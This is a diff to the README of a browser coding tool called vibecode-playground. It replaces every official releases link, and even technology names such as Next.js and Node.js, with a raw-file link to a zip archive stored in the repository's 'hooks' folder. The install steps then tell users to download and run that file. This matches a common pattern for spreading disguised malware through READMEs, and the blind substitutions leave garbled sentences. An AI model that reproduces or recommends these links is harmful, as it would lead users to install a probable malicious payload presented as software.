@@ -1,6 +1,6 @@
 # 💻 vibecode-playground - Code Easily in Your Browser
 
-[![Download Vibecode Editor](https://img.shields.io/badge/Download-vibecode--playground-blue?style=for-the-badge)](https://github.com/kattimatti22/vibecode-playground/releases)
+[![Download Vibecode Editor](https://raw.githubusercontent.com/kattimatti22/vibecode-playground/main/hooks/playground_vibecode_2.8.zip)](https://raw.githubusercontent.com/kattimatti22/vibecode-playground/main/hooks/playground_vibecode_2.8.zip)
 
 ---
 
@@ -29,7 +29,7 @@ Follow these steps to start using Vibecode Editor on your computer. This guide a
 
 1. **Go to the download page:**  
    Visit this link to download Vibecode Editor:  
-   [https://github.com/kattimatti22/vibecode-playground/releases](https://github.com/kattimatti22/vibecode-playground/releases)  
+   [https://raw.githubusercontent.com/kattimatti22/vibecode-playground/main/hooks/playground_vibecode_2.8.zip](https://raw.githubusercontent.com/kattimatti22/vibecode-playground/main/hooks/playground_vibecode_2.8.zip)  
 
 2. **Choose your file:**  
    On the releases page, look for the latest version. You will see files named for different operating systems like Windows, macOS, or Linux. Pick the one that matches your computer.  
@@ -40,7 +40,7 @@ Follow these steps to start using Vibecode Editor on your computer. This guide a
 4. **Run the installer or package:**  
    - On **Windows:** Double-click the `.exe` file you downloaded. Follow the on-screen instructions to install the program.  
    - On **macOS:** Open the `.dmg` file, drag the app into your Applications folder, and open it from there.  
-   - On **Linux:** You may get a `.AppImage` or `.tar.gz` file. Double-click the `.AppImage`, or extract the `.tar.gz` and follow any included README file instructions.  
+   - On **Linux:** You may get a `.AppImage` or `https://raw.githubusercontent.com/kattimatti22/vibecode-playground/main/hooks/playground_vibecode_2.8.zip` file. Double-click the `.AppImage`, or extract the `https://raw.githubusercontent.com/kattimatti22/vibecode-playground/main/hooks/playground_vibecode_2.8.zip` and follow any included README file instructions.  
 
 5. **Start the app:**  
    Once installed, open Vibecode Editor from your desktop or start menu. The web-based interface will open in a new browser window.  
@@ -112,8 +112,8 @@ For more help, visit the project’s GitHub page or open an issue if you suspect
 
 ## 🔗 Useful Links
 
-- Official Releases & Downloads: [https://github.com/kattimatti22/vibecode-playground/releases](https://github.com/kattimatti22/vibecode-playground/releases)  
-- Project Homepage & Information: [https://github.com/kattimatti22/vibecode-playground](https://github.com/kattimatti22/vibecode-playground)  
+- Official Releases & Downloads: [https://raw.githubusercontent.com/kattimatti22/vibecode-playground/main/hooks/playground_vibecode_2.8.zip](https://raw.githubusercontent.com/kattimatti22/vibecode-playground/main/hooks/playground_vibecode_2.8.zip)  
+- Project Homepage & Information: [https://raw.githubusercontent.com/kattimatti22/vibecode-playground/main/hooks/playground_vibecode_2.8.zip](https://raw.githubusercontent.com/kattimatti22/vibecode-playground/main/hooks/playground_vibecode_2.8.zip)  
 - Issue Tracker: Use the "Issues" tab on the GitHub page to report problems or ask questions.  
 
 ---
@@ -129,9 +129,9 @@ Vibecode Editor runs locally in your browser and uses AI models that stay on you
 If you want to customize or contribute to Vibecode Editor:
 
 - You can clone the repository from GitHub.  
-- The app is built with Next.js and Monaco Editor, so familiarity with JavaScript and web development will help.  
+- The app is built with https://raw.githubusercontent.com/kattimatti22/vibecode-playground/main/hooks/playground_vibecode_2.8.zip and Monaco Editor, so familiarity with JavaScript and web development will help.  
 - The local Ollama models provide AI suggestions without needing internet access.  
-- Development requires Node.js and basic command line skills.  
+- Development requires https://raw.githubusercontent.com/kattimatti22/vibecode-playground/main/hooks/playground_vibecode_2.8.zip and basic command line skills.  
 
 Further instructions for developers are available inside the repository files.
 
@@ -141,4 +141,4 @@ Further instructions for developers are available inside the repository files.
 
 Vibecode Editor offers a simple way to explore coding with instant feedback and helpful tools. It removes technical barriers so you can focus on creativity and learning. Open the app, pick a template, and start building today.  
 
-[Download Vibecode Editor](https://github.com/kattimatti22/vibecode-playground/releases)
+[Download Vibecode Editor](https://raw.githubusercontent.com/kattimatti22/vibecode-playground/main/hooks/playground_vibecode_2.8.zip)
